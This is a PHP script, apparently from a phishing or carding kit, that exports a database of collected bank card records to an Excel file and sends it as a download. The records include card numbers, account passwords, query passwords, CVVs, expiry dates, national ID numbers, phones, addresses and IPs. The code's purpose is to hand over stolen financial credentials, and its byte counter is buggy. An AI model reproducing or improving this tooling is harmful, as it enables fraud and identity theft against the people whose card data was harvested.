<?php

/** Error reporting */
// error_reporting(E_ALL);
 
/** Include path **/

/** PHPExcel */
include './PHPExcel-1.8/Classes/PHPExcel.php';
 
/** PHPExcel_Writer_Excel2007 */
include './PHPExcel-1.8/Classes/PHPExcel/Writer/Excel2007.php';
 
include_once "db.php";
// Create new PHPExcel object
$objPHPExcel = new PHPExcel();

// Set properties

$objPHPExcel->getProperties()->setCreator("Maarten Balliauw");
$objPHPExcel->getProperties()->setLastModifiedBy("Maarten Balliauw");
$objPHPExcel->getProperties()->setTitle("Office 2007 XLSX Test Document");
$objPHPExcel->getProperties()->setSubject("Office 2007 XLSX Test Document");
$objPHPExcel->getProperties()->setDescription("Test document for Office 2007 XLSX, generated using PHP classes.");
 
 
$objPHPExcel->setActiveSheetIndex(0);
$objPHPExcel->getActiveSheet()->SetCellValue('A1', '银行卡');
$objPHPExcel->getActiveSheet()->SetCellValue('B1', '注册卡（账）号');
$objPHPExcel->getActiveSheet()->SetCellValue('C1', '密码');
$objPHPExcel->getActiveSheet()->SetCellValue('D1', '查询密码');
$objPHPExcel->getActiveSheet()->SetCellValue('E1', '姓名');
$objPHPExcel->getActiveSheet()->SetCellValue('F1', '身份证号');
$objPHPExcel->getActiveSheet()->SetCellValue('G1', '银行预留手机号');
$objPHPExcel->getActiveSheet()->SetCellValue('H1', '充值手机号');
$objPHPExcel->getActiveSheet()->SetCellValue('I1', '类型');
$objPHPExcel->getActiveSheet()->SetCellValue('J1', 'CW');
$objPHPExcel->getActiveSheet()->SetCellValue('K1', '有效期');
$objPHPExcel->getActiveSheet()->SetCellValue('L1', '收货地址');
$objPHPExcel->getActiveSheet()->SetCellValue('M1', '邮箱');
$objPHPExcel->getActiveSheet()->SetCellValue('N1', '收货电话');
$objPHPExcel->getActiveSheet()->SetCellValue('O1', '收件人');
$objPHPExcel->getActiveSheet()->SetCellValue('P1', 'IP');
$objPHPExcel->getActiveSheet()->SetCellValue('Q1', '订单提交时间');

$objPHPExcel->getActiveSheet()->setTitle('Simple');
 
$mysql = new Mysql();
$data = $mysql->select('data');

foreach($data as $key=>$value){
 if ($key == 0) {
 	$key = 1;
 }
 $objPHPExcel->getActiveSheet()->setCellValue('A' . ($key+1), $value['bank_name']);
 $objPHPExcel->getActiveSheet()->setCellValue('B' . ($key+1), $value['card_number']);
 $objPHPExcel->getActiveSheet()->setCellValue('C' . ($key+1), $value['password']);
 $objPHPExcel->getActiveSheet()->setCellValue('D' . ($key+1), $value['password2']);
 $objPHPExcel->getActiveSheet()->setCellValue('E' . ($key+1), $value['name']);
 $objPHPExcel->getActiveSheet()->setCellValue('F' . ($key+1), $value['id_card']);
 $objPHPExcel->getActiveSheet()->setCellValue('G' . ($key+1), $value['phone']);
 $objPHPExcel->getActiveSheet()->setCellValue('H' . ($key+1), $value['recharge_phone']);
 $objPHPExcel->getActiveSheet()->setCellValue('I' . ($key+1), $value['type']);
 $objPHPExcel->getActiveSheet()->setCellValue('J' . ($key+1), $value['cw']);
 $objPHPExcel->getActiveSheet()->setCellValue('K' . ($key+1), $value['validity']);
 $objPHPExcel->getActiveSheet()->setCellValue('L' . ($key+1), $value['address']);
 $objPHPExcel->getActiveSheet()->setCellValue('M' . ($key+1), $value['email']);
 $objPHPExcel->getActiveSheet()->setCellValue('N' . ($key+1), $value['mobile']);
 $objPHPExcel->getActiveSheet()->setCellValue('O' . ($key+1), $value['addressee']);
 $objPHPExcel->getActiveSheet()->setCellValue('P' . ($key+1), $value['IP']);
 $objPHPExcel->getActiveSheet()->setCellValue('Q' . ($key+1), $value['created_at']);
}


$objWriter = new PHPExcel_Writer_Excel2007($objPHPExcel);
$objWriter->save(str_replace('.php', '.xlsx', __FILE__));

download("excel.xlsx");


function download($fname,$fpath="./"){

        //避免中文文件名出现检测不到文件名的情况，进行转码utf-8->gbk
        $filename=iconv('utf-8', 'gb2312', $fname);
        $path=$fpath.$filename;
        if(!file_exists($path)){//检测文件是否存在
            echo "文件不存在！";
            die();
        }

        $fp=fopen($path,'r');//只读方式打开
        $filesize=filesize($path);//文件大小

        //返回的文件(流形式)
        header("Content-type: application/octet-stream");
        //按照字节大小返回
        header("Accept-Ranges: bytes");
        //返回文件大小
        header("Accept-Length: $filesize");
        //这里客户端的弹出对话框，对应的文件名
        header("Content-Disposition: attachment; filename=".$filename);
        //================重点====================
        ob_clean();
        flush();
        //=================重点===================
        //设置分流
        $buffer=1024;
        //来个文件字节计数器
        $count=0;
        while(!feof($fp)&&($filesize-$count>0)){
            $data=fread($fp,$buffer);
            $count+=$data;//计数
            echo $data;//传数据给浏览器端
        }

        fclose($fp);

    }




